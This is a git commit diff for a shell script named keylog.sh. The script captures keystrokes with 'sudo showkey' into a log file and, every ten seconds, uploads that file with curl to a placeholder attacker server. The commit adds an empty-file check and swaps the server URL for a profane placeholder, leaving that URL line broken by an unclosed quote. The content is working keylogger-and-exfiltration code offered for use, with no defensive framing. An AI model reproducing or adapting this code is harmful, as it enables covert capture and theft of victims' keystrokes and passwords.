7a7911dc0800da391fe5c0adef59365e958cb933
DemiGodVoid <162964001+DemiGodVoid@users.noreply.github.com>
2024-10-21 00:36:55 -0400

    Update keylog.sh

--- keylog.sh
+++ keylog.sh
@@ -5,8 +5,8 @@ sudo showkey > ./logs.txt &
 upload_logs() {
     while true; do
         sleep 10 # Uploads logs every 10 seconds. Adjust as needed.
-        if [ -f ./logs.txt ]; then
-            curl -X POST -F "file=@./logs.txt" "http://yourserver.com/upload" # Replace with your server URL
+        if [ -f ./logs.txt ] && [ -s ./logs.txt ]; then
+            curl -X POST -F "file=@./logs.txt" "http://yourfuckingserverbitch.com # Replace with your server URL
         fi
     done
 }
